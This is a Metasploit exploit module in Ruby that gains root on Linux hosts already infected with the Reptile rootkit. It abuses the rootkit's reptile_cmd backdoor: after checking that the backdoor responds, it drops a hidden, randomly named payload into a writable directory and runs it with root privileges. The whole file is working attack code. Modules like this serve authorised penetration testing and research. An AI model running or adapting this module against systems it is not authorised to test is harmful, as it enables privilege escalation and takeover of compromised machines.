# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Reptile Rootkit reptile_cmd Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module uses Reptile rootkit&#039;s `reptile_cmd` backdoor executable
        to gain root privileges using the `root` command.

        This module has been tested successfully with Reptile from `master`
        branch (2019-03-04) on Ubuntu 18.04.3 (x64) and Linux Mint 19 (x64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;f0rb1dd3n&#039;, # Reptile
          &#039;bcoles&#039;     # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;2018-10-29&#039;, # Reptile first stable release
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://github.com/f0rb1dd3n/Reptile&#039;],
          [&#039;URL&#039;, &#039;https://github.com/f0rb1dd3n/Reptile/wiki/Usage&#039;]
        ],
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;        => [[&#039;Auto&#039;, {}]],
      &#039;Notes&#039;          =>
        {
          &#039;Reliability&#039; => [ REPEATABLE_SESSION ],
          &#039;Stability&#039;   => [ CRASH_SAFE ]
        },
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptString.new(&#039;REPTILE_CMD_PATH&#039;, [true, &#039;Path to reptile_cmd executable&#039;, &#039;/reptile/reptile_cmd&#039;])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def reptile_cmd_path
    datastore[&#039;REPTILE_CMD_PATH&#039;]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
  end

  def check
    unless executable? reptile_cmd_path
      vprint_error "#{reptile_cmd_path} is not executable"
      return CheckCode::Safe
    end
    vprint_good "#{reptile_cmd_path} is executable"

    res = cmd_exec("echo id|#{reptile_cmd_path} root").to_s.strip
    vprint_status "Output: #{res}"

    if res.include?(&#039;You have no power here!&#039;)
      vprint_error &#039;Reptile kernel module is not loaded&#039;
      return CheckCode::Safe
    end

    unless res.include?(&#039;root&#039;)
      vprint_error &#039;Reptile is not installed&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;Reptile is installed and loaded&#039;

    CheckCode::Vulnerable
  end

  def exploit
    unless check == CheckCode::Vulnerable
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    payload_name = ".#{rand_text_alphanumeric 8..12}"
    payload_path = "#{base_dir}/#{payload_name}"
    upload_and_chmodx payload_path, generate_payload_exe

    print_status &#039;Executing payload...&#039;
    res = cmd_exec "echo &#039;#{payload_path}&&#039; | #{reptile_cmd_path} root & echo "
    vprint_line res
  end
end

